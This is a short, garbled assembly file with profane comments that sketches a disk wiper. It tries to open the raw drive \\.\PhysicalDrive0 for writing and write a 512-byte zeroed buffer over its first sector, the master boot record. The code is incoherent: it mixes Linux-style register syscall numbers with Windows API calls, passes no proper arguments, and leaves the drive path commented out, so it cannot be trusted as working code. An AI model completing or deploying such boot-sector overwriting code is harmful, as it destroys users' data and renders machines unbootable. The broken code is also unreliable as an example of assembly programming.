section .text
    global _start

_start:
    mov eax, 3
    ; WHAT THE FUCK mov ebx, d ;\\.\PhysicalDrive0
    mov ecx, 40000000h ; GENERIC_WRITE
    call CreateFileA

    ; sisi
    cmp eax, -1
    je _fuck
   
    ; ok pohui
    mov eax, 4
    mov ebx, -1
    mov ecx, 0
    mov edx, 0
    call SetFilePointer

    # no more sisi
    mov ecx, buffer
    mov edx, 512
    mov eax, 0
    call WriteFile

_fuck:
    mov eax, 6
    int 0x2E

    ; where is sisi
    mov eax, 1 
    xor ebx, ebx       ;  0
    int 0x2E

section .data
    ; todo 
    ; db "\\.\PhysicalDrive0", 0

section .bss
    buffer resb 512 
